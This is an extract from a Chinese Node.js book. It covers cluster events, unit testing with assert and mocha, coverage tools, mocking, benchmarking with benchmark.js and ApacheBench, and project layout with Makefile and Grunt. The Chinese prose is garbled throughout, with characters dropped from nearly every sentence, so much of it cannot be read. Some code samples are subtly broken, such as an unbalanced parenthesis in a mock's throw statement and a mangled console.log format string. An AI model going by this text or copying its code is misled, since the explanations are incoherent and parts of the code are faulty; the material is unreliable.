是中cluster.isMaster、cluster.isWorker，对于的可读性分。我用cluster.setupMaster()这个API，程工作程从上，send()起接服务从程发到程样，之后，甚至都不到程中有服务相关的。
过cluster.setupMaster()创程不是使用cluster.fork()，程序不，分，的可读性可性好。
9.4.1Cluster 
事实上cluster就是child_processnet的组应用。cluster动时，我们在
9.2.3的一样，它会在内部动TCP服务，在cluster.fork()程时，这个TCP服务端socket的发工作程。程是过cluster.fork()复的，它的环境量就在NODE_UNIQUE_ID，工作程中在listen()网端的用，它到，过SO_REUSEADDR端用，从实多个程享端。对于动的程，不在享事情。
在cluster内部创TCP服务的对使用者分，也是这使它接使用child_process样灵活。在cluster应用中，一个程只能管一组工作程，图9-12。

图9-12 在cluster应用中，一个程只能管一组工作程
对于自过child_process作时，可以灵活工作程，甚至多组工作程。因在于自过child_process作程时，可以创多个TCP服务，使
程可以享多个的服务端socket，图9-13。

图9-13自过child_process多组工作程
9.4.2Cluster 
对于性，cluster也了相多的事。
. fork复一个工作程后触发事。
. online复好一个工作程后，工作程动发一online程，程收到后，触发事。

. listening工作程中用listen()（享了服务端Socket）后，发一listening程，程收到后，触发事。
. disconnect程工作程之IPC开后会触发事。
. exit有工作程时触发事。
. setupcluster.setupMaster()后触发事。

这些事大多child_process的事相关，在程的上的。这些事对于强应用的性已经了。
9.5
管Node从线程的它有的不能分用多CPU源，定性也到。是的量是强大的，过的从，就可以应用的质量一个次。在实的复杂务中，我们可能要动很多程务，甚至从复杂，是个程应是到只做好一事，后过程信技术它们接起可。这Unix的，个程只做一事，并做好一事，复杂分解为，组强大。
管过child_process可以大Node的定性，是一程问题，有程会管。在Node的程管之外，还要用程数量的个系统的定性，使程，也能时到，使开发者可以时。
9.6
本的源下
. http://nodejs.org/docs/latest/api/child_process.html 
. http://nodejs.org/docs/latest/api/cluster.html 
. https://github.com/aleafs/pmProcess 
. http://en.wikipedia.org/wiki/Inter-process_communication 
. http://en.wikipedia.org/wiki/Pipeline_(Unix) . http://www.w3.org/TR/workers/ . http://man7.org/linux/man-pages/man7/unix.7.html

 
第1章 



在使用Node实的目开发之前，我内心也分。管JavaScript，相熟的后端语言言，Node且是新学。甚至对于前端，因为样的因，JavaScript的测试都分。Node编写的在线产品，在上用前能否好的质量，我是心问的。
从最写的自己不着，定bug到于一程序的个，到后很实对自己产的，对自己的了解心了。从对问题时的动到动，测试在这个过程中起到了至关要的作用。
测试的在于，在用产的之前，开发者它，要的质量。这的是，JavaScript开发者要，自己的，对自己产的。为自己的写测试用是一之有的，它能开发者到的为性能。
测试包测试、性能测试、测试能测试几个，本从Node实践的测试性能测试。
10.1
测试在目中着的，是几质量的中入产最高的一。管在过的JavaScript开发中，绝大多数人都了这个环，今天Node的我们不不新这。
10.1.1
最初接触测试时，很多开发者都很，自己写的，自己写测试，这事的在有的了门的测试工程开发者测试。这一对自己写的不在的为是开发者对自己测试自己心，认为测试是一，小是是，10 为要实践。强实践，就写写，过关，这使开发者不测试，不自己的。门的测试工程开发者对测试人产生，不关心自己的测试。
这要的是，的。目开发的会目的产品，开发者写的是开发者自己的产品。要产品的质量，就应有相应的。对于开发者言，测试就是最本的一。开发者不自己测试，要对下问题。
(1) 测试工程是否可
这的问题有个。一个是测试工程是否熟悉Node，不了解一个只凭过经对这个目测试，有可能为的为，这对质量的目。一个是，在人事动因，可能并不一定到开发者的，从使测试用的本高。
(2) 是否可信对于Node开源社区言（有3多），作为一个不的开发者，产的
测试都没有，使用者在时，内心也会过多个的问。
(3) 在产品过程中，继续质量
测试的在于个测试用的都是一可能的。API时，测试用可以很好是否下。对于可能的入，一测试，都能它的。动后，可以过测试的动是否已定的。
对于上问题，你的是不关心，喜你，你的目只能时，甚至只是个产品。
一个对测试的是，要在目中测试，势会开发者的目。这个是定的，因为产品质可以经的产品，要多的。只是工程，自可以产。区在于后续的，因为有测试的质量，可以心加能。后者会入的之，补，开发者也
只想做新目，的目最后不可，者不。甚至到目下线时，灵复。测试只是在会多一定的本，这个本要于后深的入。至于是在入本还是在后入，只是还是的。
开测试之前，要的问题是的可测试性，它是能为编写测试的前。复杂的分，甚至像一样作一，要对它们测试，相大。一个就是为一写测试时，这有，这会为开发者心，这样的最要。好的测试是量的，写测试之是一个相的，的小的时候，也就着定，的可测试性好，甚至。
言，编写可测试有以下几个可以。
一一的多，为编写测试的时候就要多的入数，后推测它的。，一中包数的接，也包，
为它编写测试用就要时关数接数。好的是这解分，个一的，分测试数接数。
. 过对程序接后，我们可以对接测试，实的不为接编写的测试。
. 次分实上是一的一实。在MVC的应用中，就是的次分，不分个次，想这个入测试。过分之后，可以测试，。

对于开发者言，不仅要编写测试，还应编写可测试。
10.1.2
测试要包言、测试、测试用、测试、mock、续几个，由于Node的性，它还会加入测试有的测试这个部分。
1. 
于JavaScript入门为，在开源社区中可以到多不测试的，甚至有的作者并不了解测试是事。开发者仅仅在test.js者demo.js到，这对想一使用的用会在心。以下为个开源的
var readOF = require("readof"); readOF.read(pic, target_path, function (error, data) { // do something }); 
对质量没有，这要源于以下。
没有对的测。入并不。这样的的是It works不是Testing。可以并不
是没有问题的。对测，以认用是的，是最本的测试。就是测试中用最小是否的测。有对Node的源过研，会发Node中在着assert这个，以很多要都用了这个。言，上的解是
中assertion中的的式的的的的。中错误。
一言以之，言用于程序在时是否。JavaScript的言最自于10 CommonJS的测试（http://wiki.commonjs.org/wiki/Unit_Testing/1.0），Node实了中的言部分。
下是assert的工作
var assert = require('assert'); assert.equal(Math.max(1, 100), 100); 
一assert.equal()不，会AssertionError，个程序会。没有对做言的，都不是测试。没有测试的，都是不可信的。
在言中，我们定了以下几测。
. ok()是否为。
. equal()实与是否相。
. notEqual()实与是否不相。
. deepEqual()实与是否深相（对数组的是否相）。
. notDeepEqual()实与是否不深相。
. strictEqual()实与是否相（相于===）。
. notStrictEqual()实与是否不相（相于!==）。
. throws()是否。之外，Node的assert还了下个言。
. doesNotThrow()是否没有。
. ifError()实是否为一个（null、undefined、0、''、false），实为，会。

目前，上的言大多都是于assert的，这包括的should.js言。
2. 
前到言一，会个应用，这对于做大言时并不友好。用的做是，下的并继续，最后生测试。这些务的者就是测试。
测试用于为测试服务，它本并不与测试，要用于管测试用生测试，测试用的开发，高测试用的可性可读性，以一些性的工作。这我们要的优测试是mocha，它自Node社区的开发者TJ Holowaychuk。过npm install mocha可，在时加-g可以为工。
. 
我们测试用的不组织为测试，今的测试要有TDD（测试驱动开发）BDD（为驱动开发），它们的下。
. TDD关有能是否实，一个能都对应的测试用BDD关为是否，自下的。
. TDD的于能书的BDD的接于自语言的习。

mocha对于测试都有。下为测试的，BDD的下
describe('Array', function(){ before(function(){  // ... }); 
describe('#indexOf()', function(){  it('should return -1 when not present', function(){ [1,2,3].indexOf(4).should.equal(-1);  }); }); }); 
BDD对测试用的组织要用describeit组织。describe可以多的，到测试用时，用it。外，它还before、after、beforeEachafterEach这4个，用于describe中测试用的、、收工作。beforeafter分在入describe时触发，beforeEachafterEach分在describe中一个测试用（it）前后触发。
BDD的组织图图10-1。

图10-1 BDD的组织图
TDD的下
suite('Array', function(){ setup(function(){  // ... }); 
suite('#indexOf()', function(){  test('should return -1 when not present', function(){ assert.equal(-1, [1,2,3].indexOf(4));  }); }); }); 
TDD对测试用的组织要用suitetest。suite也可以实多，测试用用test。它的数仅包setupteardown，对应BDD中的beforeafter。TDD的组织图图10-2。

图10-2 TDD的组织图
. 
作为测试，mocha分灵活，它与言之并不，使的测试用可以用assert生，也可以用的言，should.js、expectchai。用个言，测试用后，测试是开发者质量管者都关的。
mocha了相的，用mocha --reporters可有的
$ mocha --reporters 
 dot - dot matrix  doc - html documentation  spec -hierarchical spec list  json -single json object progress -progress bar  list -spec-style listing tap - test-anything-protocol  landing -unicode landing strip  xunit -xunit reporter  teamcity -teamcity ci support  html-cov -HTML test coverage  json-cov -JSON test coverage  min - minimal reporter (great with --watch)  json-stream -newline delimited json events  markdown -markdown documentation (github flavour)  nyan -nyan cat! 
认的为dot，他用的有spec、json、html-cov。mocha -R <reporter>可用这些。json因为用，多用于他程序，html-cov用于可。图10-3是spec的。
有测试用，会到图10-4的。图10-3 spec的mocha –help可以到多的信了解使用它们。


图10-4有测试用时的
3. 
还2中到的包包中定了测试在于test目中，在于lib目下。之外，想你的测试起，请在包（package.json）中加10 相应的关系。由于mocha只在测试时要，以加到devDependencies可
"devDependencies": { "mocha": "*" } 
4. 
测试的本能后，我们对测试用也有了的认了。，一个为者能要有的、多的测试用，一个测试用中包至一个言。下
describe('#indexOf()', function(){ it('should return -1 when not present', function(){  [1,2,3].indexOf(4).should.equal(-1); }); 
it('should return index when present', function(){  [1,2,3].indexOf(1).should.equal(0);  [1,2,3].indexOf(2).should.equal(1);  [1,2,3].indexOf(3).should.equal(2); 
}); }); 
测试用最要过测试反测试测试对能的，这是最本的测试用。对于Node言，不仅有这样的用，还有时要关。
. 
由于Node环境的性，用，这也了在测试的。在他编程语言中，Java、Ruby、Python，大多是的，以测试用本上只要包一些言可。是在Node中，的，并且不数时用，这我们在对用测试时，后续测试用的。
，mocha解决了这个问题。以下为fs中readFile的测试用
it('fs.readFile should be ok', function (done) { 
fs.readFile('file_path', 'utf-8', function (err, data) {  should.not.exist(err);  done(); 
}); }); 
在上中，测试用it()接个数用题（title）数（fn）。过这个数的（fn.length）这个用是否是用，是用，在测试用时，会一个数done()入为实，测试要动用这个数测试前测试用，后测试才下一个测试用的，这与4到的触发分。
. 
测试的问题并不是言有，要在于数的时从。过上的，我们done()在时。，done()一没有，会有的测试用于，这不是的。
mocha有的测试用加了时，一个用的时过了时，会下一个时，后下一个测试用。下这个测试用因为10后才，测试为时
it('async test', function (done) { // 模执行的异步方法setTimeout(done, 10000); 
}); 
mocha的认时时为2000。一情下，过mocha -t <ms>有用的时时。时时，可以在测试用it中用this.timeout(ms)实对个用的，下
it('should take less than 500ms', function (done) { this.timeout(500); setTimeout(done, 300); 
}); 
也可以在describe中用this.timeout(ms)下前的有用
describe('a suite of tests', function(){ this.timeout(500); it('should take less than 500ms', function (done) { 
 setTimeout(done, 300); }); 
it('should take less than 500ms as well', function (done) {  setTimeout(done, 200); }); }); 
5. 
过不加测试用，会不的分不的情。是测试对的情，我们要的工。测试是测试中的一个要，它能括性的，也能统到的情。
对于下这
exports.parseAsync = function (input, callback) { 
setTimeout(function () {  var result; try { 
result = JSON.parse(input);  } catch (e) { 
return callback(e); }  callback(null, result); 
}, 10); }; 
我们为加部分测试用，下
describe('parseAsync', function () { it('parseAsync should ok', function (done) {  lib.parseAsync('{"name": "JacksonTian"}', function (err, data) { should.not.exist(err); 
data.name.should.be.equal('JacksonTian'); done();  }); }); }); 
要探这个测试用对源的，要一工统一是否，这要的相关工是jscover。过npm install jscover -g的可以。
你的这CommonJS并且在lib目下，用jscover lib lib-cov源的编。jscover会lib目下的.js编到lib-cov目下，你会到下的
_$jscoverage['index.js'][31]++; 
exports.parseAsync = function(input, callback) { _$jscoverage['index.js'][32]++; setTimeout(function() { _$jscoverage['index.js'][33]++; var result; _$jscoverage['index.js'][34]++; try { 
 _$jscoverage['index.js'][35]++; 
 result = JSON.parse(input); } catch (e) { _$jscoverage['index.js'][37]++; return callback(e); 
} _$jscoverage['index.js'][39]++; callback(null, result); 
}, 10); }; 
我们到，一始的前都有一些_$jscoverage的，它们会在时统一了多次，也了统是否外，还能统次数。在测试时，我们过require入lib目下的测试。是为了到测试，在测试用时编之后的。为了区分这入始的区，我们在的入（是包目下的index.js）中要做的区，下
module.exports = process.env.LIB_COV ? require('./lib-cov/index') : require('./lib/index'); 
在测试时，会一个LIB_COV的环境量，以区分测试环境环境。编好的之后，以下可到的
//设置当前命行有的量export LIB_COV=1 mocha -R html-cov > coverage.html 
这个程的图图10-5。

图10-5程图
在这次测试中，我们用到了html-cov，它我们生了一HTML页，了一到，为多。图10-6为页图，从中可以到有一没有测试到。

图10-6测试
测试我们定没有测试到的。，我们会不经一些情的。一个的入可以情，下我们为补测试用
it('parseAsync should throw err', function (done) { 
lib.parseAsync('{"name": "JacksonTian"}}', function (err, data) {  should.exist(err);  done(); 
}); }); 
次测试用，我们到一个100%的页，图10-7。

图10-7 100%的页
在使用过程中，也可以使用json-cov，这样数对余系统为友好。事实上，html-cov是用json-cov的数与的。jscover已经用，是还有个问题。
它的编部分是过Java实的，这样环境上就多了Java。
它要编到一个外的新目，这个过程相对。blanket解决了这个问题，它由JavaScript实，编的过程也是的，外的目，对于目没有外的入。
blanket与jscover的本一，在实过程上有不，在于blanket编的入在require中，不是外编，测试时用编后的，它的技在require中。
它的jscover要，只要在有测试用之前过--require入它可
mocha --require blanket -R html-cov > coverage.html 
一个要的是，在包中scripts。在scripts中，pattern性用以要编的
"scripts": { "blanket": { "pattern": "eventproxy/lib" } }, 
在测试中过require入一个时，它这个的实，这个，就对它编。它的编与jscover不，jscover要编到上的一个目lib-cov中。是blanket不，它的与2中到的编相。我们，对于.js，Node会它的编在require.extensions['.js']中。blanket是在这个环中实了编，的入到始中，后由始，图图10-8。

图10-8 blanket的编程
使用blanket之后，就环境量了，也环境入，以下这就不要了
module.exports = process.env.LIB_COV ? require('./lib-cov/index') : require('./lib/index'); 
6. mock 
前到开发者会一些，中相大一部分因在于的情实。大多与入数并绝对的关系，数的用，了入外，还有可能是网、入数相关的情，这相对以。
在测试，实是一个不小的目，它有着一个的mock。我们过用测试上的性。
以下的为，系统的是绝对不的，为了测试的性程上的，本高
exports.getContent = function (filename) { try {  return fs.readFileSync(filename, 'utf-8'); } catch (e) { return ''; } }; 
为了解决这个问题，我们过fs.readFileSync()触发。时为了测试用不余用，我们要在后还它。为，前到的before()after()10 数上了用场，相关下
describe("getContent", function () { 
var _readFileSync; 
before(function () { 
 _readFileSync = fs.readFileSync;  fs.readFileSync = function (filename, encoding) { throw new Error("mock readFileSync error")); 
 }; }); // it(); after(function () { 
 fs.readFileSync = _readFileSync; }) }); 
我们在测试用前用，后还它。个测试用前后都要还，就使用beforeEach()afterEach()这个数。由于mock的过程，这推荐一个解决事muk，下
var fs = require('fs'); var muk = require('muk'); before(function () { 
muk(fs, 'readFileSync', function(path, encoding) {  throw new Error("mock readFileSync error"); }); }); 
// it(); 
after(function () { muk.restore(); }); 
有多个用时，相关下
var fs = require('fs'); var muk = require('muk'); beforeEach(function () { 
muk(fs, 'readFileSync', function(path, encoding) {  throw new Error("mock readFileSync error"); }); }); 
// it(); // it(); 
afterEach(function () { muk.restore(); }); 
时时用，用后用muk.restore()复可。
过的情，在只要测用的是否可，关是否是的。可以很大程开发者的性，用的能。
的一是，对于的，要分小心是否为。下的mock可能会起外的
fs.readFile = function (filename, encoding, callback) { callback(new Error("mock readFile error")); }; 
的mock是量mock后的为与始为一，相关下
fs.readFile = function (filename, encoding, callback) { process.nextTick(function () {  callback(new Error("mock readFile error")); }); }; 
时，我们用process.nextTick()使能可。关于process.nextTick()的，3中有，不做多解。
7. 
对于Node言，一个会在测试的过程中，就是有的测试，这在2中过。只有在exportsmodule.exports上的量才可以外部过require入问，余只能在内部用问。
在Java一的语言，有的问可以过反的实。，Node实是否可以因为它们是有就不用为它们加测试
是否定的，为了应用的性，我们应可能加测试用。了这些有过exports外，还有的是定的。rewire了一的实对有的问。
rewire的用与require分。对于下的有，我们它并为测试用
var limit = function (num) { return num < 0 ? 0 : num; }; 
测试用下
it('limit should return success', function () { var lib = rewire('../lib/index.js'); var litmit = lib.__get__('limit'); litmit(10).should.be.equal(10); 
}); 
rewire的在于它入时，像require一样对始做了一定的脚。了加(function(exports, require, module, __filename, __dirname) {});的包外，它还入了部分，下
(function (exports, require, module, __filename, __dirname) { var method = function () {}; exports.__set__ = function (name, value) {
 eval(name " = " value.toString()); }; exports.__get__ = function (name){ 
 return eval(name); }; }); 
一个rewire入的都有__set__()__get__()。它用了包的，在eval()时，实了对内部部量的问，从可以部量测试用用。
10.1.3
Node以的都相对，在开发目时，还要一定的工实工程自动（这我们中的一续），以工本。
1. 
Node在*nix系统下可以很好用一些熟工，中Makefile小灵活，用工程。下是我用的Makefile的内
TESTS = test/*.js REPORTER = spec TIMEOUT = 10000 MOCHA_OPTS = 
test: 
 @NODE_ENV=test ./node_modules/mocha/bin/mocha \ --reporter $(REPORTER) \ --timeout $(TIMEOUT) \ $(MOCHA_OPTS) \ $(TESTS) 
test-cov:  @$(MAKE) test MOCHA_OPTS='--require blanket' REPORTER=html-cov > coverage.html 
test-all: test test-cov 
.PHONY: test 开发者动之后，只过make testmake test-cov可复杂的测试。这要以下。
. Makefile的是tab，不能用。
在包中blanket。
2. 

目工程可以我们目组织定的，以。是对于实的目言，是的，本的信，还要一个续的环境。至于续，个都有自己定的，这一下社区中的用travis-ci实续。travis-ci与GitHub的可相。GitHub了托管社编程的好环境，程序们可以在上很社的clone、fork、pull request、issues作，travis-ci
补了GitHub在续的。Git本系统了hook机，用在push后会触发一个hook脚本，travis-ci是过这与GitHub接起的。你的与travis-ci接起分，只下几可。
(1) 在https://travis-ci.org/上过OAuth定你的GitHub。
(2) 在GitHub的管（admin）中开services hook页，在这个页中可以发GitHub上了很多于git hook的服务。
(3) 到travis服务，活可。(4) 次push到GitHub的上后，会触发服务。之外，一定了GitHub之后，也可以过travis-ci的管些开
续服务。
travis-ci了的语言时环境外，还数服务、、，分强大，深用。要的一是，travis-ci是于Ruby创的目，最开始是为Ruby目服务的，目前了多后端语言的测试续服务，是它会目认做Ruby目。为了解决问题，要在自己的目中一个.travis.yml，之travis-ci是的目。Node目的下
language: node_js 
node_js: 
- "0.8" 
- "0.10" 
中要有个，language的本。travis-ci在收到GitHub的后，会pull最新的到测试机中，并对应的环境本。还2中到的scripts前blanket的就在这个上。这travis-ci会npm test动个测试，前到的mocha -R specmake test应在package.json中
"scripts": { 
"test": "make test" 
}, 
travis-ci了一个测试的服务。在GitHub上，也会经到的图者的图
。它就是由travis-ci的目服务，由下组
https://travis-ci.org/<username>/<repo>.png?branch=<branch>
图能实时反目的测试。passing的图能在使用者研时加使用前的信心。
travis-ci了服务外，还了次测试的，过这些信我们可以目的。
10.1.4 
在这一中，我们了的测试的，对于一些定场景下的测试
并做过多，测试Web应用，读者可以自用Web的测试，Connect Express了supertest测试的编写。
在目中经会因为的产生务的动，没有测试的，发生后，很定动的。一为目的测试，目的会因为测试了于心。的测试在一定程上也着目的熟。
10.2
测试要用于测的为是否。在的为测后，还要对已有的性能作，测已有能是否能生产环境的性能要，能否实务的。，性能也是能。
性能测试的广，包括测试、测试测试。由于这部分内并Node有，为了收，这只会下测试。了测试，这还对Web应用网的性能测试务的。
10.2.1
本上，个开发者都为自己的写测试的能。测试要统的就是在多时内了多次个。为了强可性，一会以次数作为，后时，以性能的。
我们要测试ECMAScript5的Array.prototype.map环，它们都是一个数组，数的到一个新的数组，相关下
var nativeMap = function (arr, callback) { return arr.map(callback); }; 
var customMap = function (arr, callback) { var ret = []; for (var i = 0; i < arr.length; i++) { 

 ret.push(callback(arr[i], i, arr)); } return ret; 
}; 
接的就是相的入数，后相的次数，最后时。为我们可以写一个这个务，下
var run = function (name, times, fn, arr, callback) { var start = (new Date()).getTime(); for (var i =0;i < times; i++) { 
 fn(arr, callback); } 
var end = (new Date()).getTime(); console.log('Running s d times cost %d ms', name, times, end -start); 
%% 
}; 
最后，分用1 000000次
var callback = function (item) { return item; }; 
run('nativeMap', 1000000, nativeMap, [0, 1, 2, 3, 5, 6], callback); run('customMap', 1000000, customMap, [0, 1, 2, 3, 5, 6], callback); 
到的下
Running nativeMap 1000000 times cost 873 ms Running customMap 1000000 times cost 122 ms 
在我的机上测试Array.prototype.map相的务，要for环7的时。上就是测试的本。为了到好的，这benchmark这个是组织测试的，相关下
var Benchmark = require('benchmark'); 
var suite = new Benchmark.Suite(); 
var arr = [0, 1, 2, 3, 5, 6]; suite.add('nativeMap', function () { return arr.map(callback); 
}).add('customMap', function () { var ret = []; for (var i = 0; i < arr.length; i++) { 
 ret.push(callback(arr[i])); } return ret; 
}).on('cycle', function (event) { console.log(String(event.target)); }).on('complete', function() { console.log('Fastest is ' + this.filter('fastest').pluck('name')); }).run(); 
它过suite组织组测试，在测试中用add()加测试的。上，到的下
nativeMap x 1,227,341 ops/sec ±1.99% (83 runs sampled) customMap x 7,919,649 ops/sec ±0.57%(96 runs sampled) Fastest is customMap 
benchmark的与我们用测试多±1.99%(83 runs sampled) 这一10 。事实上，benchmark并不是统多次测试后对时，它对测试有着的样过程。多次决于样到的数能否统。83 runs sampled对nativeMap测试的过程中，有83个样本，后我们这些样本，可以推，±1.99%这部分数。
10.2.2
了可以对本的测试外，还会对网接测试以网接的性能，这在6.4过。对网接做测试要的几个有、应时并发数，这些反了服务的并发能。
最用的工是ab、siege、http_load，下我们过ab工测试，相关下
$ ab -c 10 -t 3 http://localhost:8001/ This is ApacheBench, Version 2.3 <$Revision: 655654 $> Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ 
Benchmarking localhost (be patient) Completed 5000 requests Completed 10000 requests Finished 11573 requests 
Server Software: Server Hostname: localhost Server Port: 8001 
Document Path: / Document Length: 10240 bytes 
Concurrency Level: 10 Time taken for tests: 3.000 seconds Complete requests: 11573 Failed requests: 0 Write errors: 0 Total transferred: 119375495 bytes HTML transferred: 118507520 bytes Requests per second: 3857.60 [#/sec] (mean) Time per request: 2.592 [ms] (mean) Time per request: 0.259 [ms] (mean, across all concurrent requests) Transfer rate: 38858.59 [Kbytes/sec] received 
Connection Times (ms) 
min mean[+/-sd] median  max Connect: 0 0  0.3 0 31 Processing: 1 2  1.9 2 35 Waiting: 0 2  1.9 2 35 Total: 1 3  2.0 235 
Percentage of the requests served within a certain time (ms) 50 % 2 66 % 3 75 % 3 80 % 3 90 %3 
95 % 3 98 % 5 99 %6 
 100%  35 (longes t request) 
上10个并发用续3服务端发请。下要上中个数的。
. Document Path的，为/。
. Document Length的，就是的大小，这有10KB。
. Concurrency Level并发，就是我们在中入的c，为10，10个并发。
. Time taken for tests有测试的时，它与中入的t有入。
. Complete requests在这次测试中一多次请。
. Failed requests中产生的请数，这次测试中没有的请。
. Write errors在写入过程中的次数（接开的）。
. Total transferred有的大小。
. HTML transferred仅HTTP的大小，它上一个小。
. Requests per second这是我们关的一个，它服务能多请，是反服务并发能的。这个RPSQPS。
个Time per request一个的是用时，个的是服务请事，前者以并发数到后者。
. Transfer rate，于的大小以时，这个网的。
. Connection Times接时，它包括客端服务端立接、服务端请、应的过程。最后的数是请的应时分，这个数是Time per request的实分。可以到，

50%的请都在2ms内，99%的请都在6ms内。外，要的是，上测试是在我的本上的，我的本的相关下2.4GHz IntelCorei5内8GB1333 MHz DDR3 
10.2.3
Felix Geisend.rfer是Node的一个贡献者，时也是一些优的作者，中最的为他的几个MySQL驱动，以性能。他在Faster than C中到了一他使用的开发，也是BDD，为BenchmarkDrivenDevelopment，测试驱动开发，10 中要分为下几程图图10-9。
(1) 写测试。
(2) 写/。(3) 收数。

(4) 问题。(5)到(2)。

图10-9测试驱动开发的程图
之前测试的服务端脚本在个CPU上，为了cluster是否有，我们可以Felix Geisend.rfer的。过上的测试，我们已经了一遍上程。接下，我们到(2)，是否有性能的。
始，下我们新一个cluster.js，用于机上的CPU数量动多程服务，相关下
var cluster = require('cluster'); 
cluster.setupMaster({ exec: "server.js" }); 
var cpus = require('os').cpus(); for (var i = 0; i < cpus.length; i++) { 
cluster.fork(); } console.log('start ' + cpus.length + ' workers.'); 
接着过下动新的服务
node cluster.js start 4 workers. 
后用相的数测试，动多个程是否是之有的。测试下
$ ab -c 10 -t 3 http://localhost:8001/ This is ApacheBench, Version 2.3 <$Revision: 655654 $> Copyright 1996 Adam Twiss, Zeus Technology Ltd, http://www.zeustech.net/ Licensed to The Apache Software Foundation, http://www.apache.org/ 
Benchmarking localhost (be patient) Completed 5000 requests Completed 10000 requests Finished 14145 requests 
Server Software: Server Hostname: localhost 
Server Port: 8001 
Document Path: / Document Length: 10240 bytes 
Concurrency Level: 10 Time taken for tests: 3.010 seconds Complete requests: 14145 Failed requests: 0 Write errors: 0 Total transferred: 145905675 bytes HTML transferred: 144844800 bytes Requests per second: 4699.53 [#/sec] (mean) Time per request: 2.128 [ms] (mean) Time per request: 0.213 [ms] (mean, across all concurrent requests) Transfer rate: 47339.54 [Kbytes/sec] received 
Connection Times (ms) 
min mean[+/-sd] median  max 
Connect: 0 0  0.5 0 61 
Processing: 0 2  5.8 1 215 
Waiting: 0 2  5.8 1 215 
Total: 1 2  5.8 2 215 
Percentage of the requests served within a certain time (ms) 
50 % 2 
66 % 2 
75 % 2 
80 % 2 
90 % 3 
95 % 3 
98 % 4 
99 %5 
 100 %215 (longest request) 
从测试可以到，QPS从的3857.60了4699.53，这个性能并没有与CPU的数量线性，这个问题我们不，它已经了我们的动实是能性能的。
10.2.4
，在实的能开发之前，我们要务量，以能开发后能实的在线务量。用量只有几个，天的PV只有几个，网开发几不要优就能。PV上10甚至、，就要用性能测试是否能实务，不，就要用优服务能。
个页天的问量为100。实务情，要问量大中在10个小时10 以内，就是
QPS =PV/10h 100的务问量为QPS，于27.7，服务要27.7个请才能务量。
10.3
测试是应用者系统最要的质量。有测试实践的目，对的次都好。测试能目个部的性，也能在目过程中很好反质量。没有测试，就没有的走。
对于性能，在编过程中一定在部分性认，与实情有部分，性能测试能很好这。
10.4
本的源下
. http://nodejs.org/docs/latest/api/assert.html 
. http://visionmedia.github.com/mocha/ 
. https://github.com/visionmedia/should.js 
. https://github.com/fent/node-muk 
. https://github.com/alex-seville/blanket 
. http://about.travis-ci.org/docs/ 
. https://github.com/JacksonTian/unittesting . https://speakerdeck.com/felixge/faster-than-c-3

 
第11章 



Node相对于大多数Web技术还是年的，这着没有熟的应用系统可以接上使用，还于。反过，这也能开发者接触到多的，HTTP、程、服务，这些与他有技术并实质性的。对于Node开发者言，很多他语言走过的要开发者着Node性新践一遍。这并不是事，Node接使开发者对于的可高。
目前，在国内大多数人都Node以实性质的使用，国外已经有的目Node应用在实的生产环境中，eBay的数中、Linkedin动应用的服务端。本-Node产品过程中要的一些，这些实是性的，并Node有。于部分Node开发者可能从前端，为了Node生的，以加了。管因为熟悉JavaScript，可以好上Node，是事实上从到产品还有的要补。
在实的产品中，要很多编相关的工作以目的产品的，这些包括工程、、、部。只有这些务在续性，才目是活着的。
11.1
的工程，可以解为目的组织能。在上，就是的组织能。对于不的目，组织也有不。之外，还应有能个目起的灵性。
目的组织就作的，目的的几不可能，有、有的组织的生才会，才。
在目工程过程中，最本的几是目、工、编，下一解。
11.1.1
目前，要的目为Web应用应用。的应用CommonJS的包可，可2。对于Web应用，组织有样，是只要一可。的Web应用都是以MVC为要的，余部分在这个上。下是我的11 个Web应用目
$ tree -L 2 .  History.md //目动 INSTALL.md //安装 Makefile // Makefile文件 benchmark // 基准测试 controllers //控制器 lib // 有模块化的文件目录 middlewares //中间件 package.json // 包描述文件目配置 proxy //数据代理目录类MVC中的M  test //测试目录 tools //工具目录 views //视图目录 routes.js // 路注表 dispatch.js //多进程理 README.md // 目文件 assets // 静态文件目录 assets.json //静态文件与CDN路径的文件 bin // 执行本 config // 配置目录 logs //日志目录 app.js // 工作进程
这个目能的分门到目中，中包的MVC定CommonJS定以一些自有定。熟一的Web应用（Express）还了工初始Web应用，为开发者了一个好的起。
在实的目中，还在node_modules这样一个目，这个目不用加入到本中。在部目时，我们过npm installpackage.json中的时，会自动生这个目。
11.1.2
有了源目，只是了一。要想能用上源，还要一定的作，这些作要有并、大小、包应用、编。次都工这些作，会下。为了源，工作工，工就是的。用作过工起后，后续只要的就能大部分工作了。
目前，在Node的应用中，的工还是牌的make，它的是只在*nix作系统下有。为了实，Grunt应生。Grunt过Node写，Node的能，实了很好的性。下要这个工。
1. Makefile 
Makefile是*nix系统下经的工。了Windows系统外，他系统几都能使用它。Makefile的还有Ruby的RakefileGemfile。Makefile用管一些编相关的工作。以下为经的3
$ ./configure $ make $ make install
在这3中，有Makefile有关。在Web应用中，也会在Makefile中编写一些务目，
的并编、应用包、测试、目、。下为我的个Web目的Makefile
TESTS = $(shell ls -S `find test -type f -name "*.js" -print`) TESTTIMEOUT = 5000 MOCHA_OPTS = REPORTER = spec 
install: @$PYTHON=`which python2.6` NODE_ENV=test npm install 
test: 
@NODE_ENV=test ./node_modules/mocha/bin/mocha \  --reporter $(REPORTER) \  --timeout $(TIMEOUT) \  $(MOCHA_OPTS) \  $(TESTS) 
test-cov: @$(MAKE) test REPORTER=dot @$(MAKE) test MOCHA_OPTS='--require blanket' REPORTER=html-cov > coverage.html @$(MAKE) test MOCHA_OPTS='--require blanket' REPORTER=travis-cov 
reinstall: clean @$(MAKE) install 
clean: @rm -rf ./node_modules 
build: @./bin/combo views . 
.PHONY: test test-cov clean install reinstall
这个Makefile测试、测试、目、make。Makefile与续工发工起会开发者心。
2. Grunt 
Makefile一的也就是问题了，为才有ant、rake工的。在Node生系统中，也有一工解决了Makefile的问题Grunt。
Grunt用Node写，能时在Windows*nix下。GruntNPM的包管，可以Java的Maven工，时它Makefile一样，能用的自动务工。它的与Makefile并不相Makefile托强大的bash编程，Grunt托它的11，它自用接用于的接入，的务由。
Grunt的心以grunt-contrib-开，在NPM包管上可以到。Grunt了3个分用于时、初始grunt、grunt-init、grunt-cli。后个都可以作为工使用，时-g可。
make一样，Grunt也会在目目中一个Gruntfile.js。于Makefile的务，在目下grunt会读，后解、务。下是个目的Gruntfile.js
module.exports = function(grunt) { grunt.loadNpmTasks('grunt-contrib-clean'); grunt.loadNpmTasks('grunt-contrib-concat'); grunt.loadNpmTasks("grunt-contrib-jshint"); grunt.loadNpmTasks('grunt-contrib-uglify'); grunt.loadNpmTasks('grunt-replace'); 
// Project configuration 
